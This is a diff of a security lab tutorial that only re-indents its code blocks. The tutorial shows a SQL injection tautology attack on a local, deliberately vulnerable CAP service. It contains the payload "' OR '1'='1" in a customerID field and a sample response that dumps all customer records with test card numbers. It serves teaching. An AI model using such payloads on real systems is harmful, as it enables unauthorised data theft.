@@ -100,7 +100,7 @@ Copy the contents of [services.js](./services_vulnerable.js) into your projectâ€
   - Click on "Add New File" and name it "sql-injection-demo.http".
   - Paste the following content into the file "sql-injection-demo.http":
   
-  ```
+```
   @server=http://localhost:4004
   @username=incident.support@tester.sap.com // admin role
   @password=initial
@@ -128,8 +128,8 @@ Copy the contents of [services.js](./services_vulnerable.js) into your projectâ€
   {
     "customerID": "1004100' OR '1'='1"
   }
-  
-  ``` 
+
+``` 
   Copy the contents of [sql-injection-demo.http](../../test/http/sql-injection-demo.http) into your projectâ€™s test/http/sql-injection-demo.http file.
 
 - Result:
@@ -145,7 +145,7 @@ Copy the contents of [services.js](./services_vulnerable.js) into your projectâ€
   - Confirm in your `package.json` file that the user `incident.support@tester.sap.com` is assigned the `admin` role under the `cds.requires.[development].auth.users` configuration.
   - Navigates to a function in ###Step2 that looks up customer information and click on send request.
   
-    ``` 
+``` 
     ### Step 2: SQL Injection Tautology Attack
     ### Action: Inject malicious payload ' OR '1'='1
     ### Expected: Returns ALL customer records
@@ -158,63 +158,64 @@ Copy the contents of [services.js](./services_vulnerable.js) into your projectâ€
       "customerID": "1004100' OR '1'='1"
     }
 
-    ```
+```
 - Result:
 
-  ``` 
-  HTTP/1.1 200 OK
-  X-Powered-By: Express
-  X-Correlation-ID: 06576897-f3fa-4d90-ab7c-bd175dd21abf
-  OData-Version: 4.0
-  Content-Type: application/json; charset=utf-8
-  Content-Length: 950
-  Date: Sun, 28 Sep 2025 19:02:26 GMT
-  Connection: close
-  
-  {
-    "@odata.context": "$metadata#Customers",
-    "value": [
-      {
-        "createdAt": "2025-09-28T19:02:19.936Z",
-        "createdBy": "anonymous",
-        "modifiedAt": "2025-09-28T19:02:19.936Z",
-        "modifiedBy": "anonymous",
-        "ID": "1004155",
-        "firstName": "Daniel",
-        "lastName": "Watts",
-        "name": "Daniel Watts",
-        "email": "daniel.watts@demo.com",
-        "phone": "+39-555-123",
-        "creditCardNo": "4111111111111111"
-      },
-      {
-        "createdAt": "2025-09-28T19:02:19.936Z",
-        "createdBy": "anonymous",
-        "modifiedAt": "2025-09-28T19:02:19.936Z",
-        "modifiedBy": "anonymous",
-        "ID": "1004161",
-        "firstName": "Stormy",
-        "lastName": "Weathers",
-        "name": "Stormy Weathers",
-        "email": "stormy.weathers@demo.com",
-        "phone": "+49-020-022",
-        "creditCardNo": "5500000000000004"
-      },
-      {
-        "createdAt": "2025-09-28T19:02:19.936Z",
-        "createdBy": "anonymous",
-        "modifiedAt": "2025-09-28T19:02:19.936Z",
-        "modifiedBy": "anonymous",
-        "ID": "1004100",
-        "firstName": "Sunny",
-        "lastName": "Sunshine",
-        "name": "Sunny Sunshine",
-        "email": "sunny.sunshine@demo.com",
-        "phone": "+49-555-789",
-        "creditCardNo": "3400000000000094"
-      }
-    ]
-  }  
+``` 
+HTTP/1.1 200 OK
+X-Powered-By: Express
+X-Correlation-ID: 06576897-f3fa-4d90-ab7c-bd175dd21abf
+OData-Version: 4.0
+Content-Type: application/json; charset=utf-8
+Content-Length: 950
+Date: Sun, 28 Sep 2025 19:02:26 GMT
+Connection: close
+
+{
+  "@odata.context": "$metadata#Customers",
+  "value": [
+    {
+      "createdAt": "2025-09-28T19:02:19.936Z",
+      "createdBy": "anonymous",
+      "modifiedAt": "2025-09-28T19:02:19.936Z",
+      "modifiedBy": "anonymous",
+      "ID": "1004155",
+      "firstName": "Daniel",
+      "lastName": "Watts",
+      "name": "Daniel Watts",
+      "email": "daniel.watts@demo.com",
+      "phone": "+39-555-123",
+      "creditCardNo": "4111111111111111"
+    },
+    {
+      "createdAt": "2025-09-28T19:02:19.936Z",
+      "createdBy": "anonymous",
+      "modifiedAt": "2025-09-28T19:02:19.936Z",
+      "modifiedBy": "anonymous",
+      "ID": "1004161",
+      "firstName": "Stormy",
+      "lastName": "Weathers",
+      "name": "Stormy Weathers",
+      "email": "stormy.weathers@demo.com",
+      "phone": "+49-020-022",
+      "creditCardNo": "5500000000000004"
+    },
+    {
+      "createdAt": "2025-09-28T19:02:19.936Z",
+      "createdBy": "anonymous",
+      "modifiedAt": "2025-09-28T19:02:19.936Z",
+      "modifiedBy": "anonymous",
+      "ID": "1004100",
+      "firstName": "Sunny",
+      "lastName": "Sunshine",
+      "name": "Sunny Sunshine",
+      "email": "sunny.sunshine@demo.com",
+      "phone": "+49-555-789",
+      "creditCardNo": "3400000000000094"
+    }
+  ]
+}  
+
 ``` 
 
 âœ… Exploitation Successful: The application returned the entire contents of the Customers table instead of just the record for customer ID 1004100.
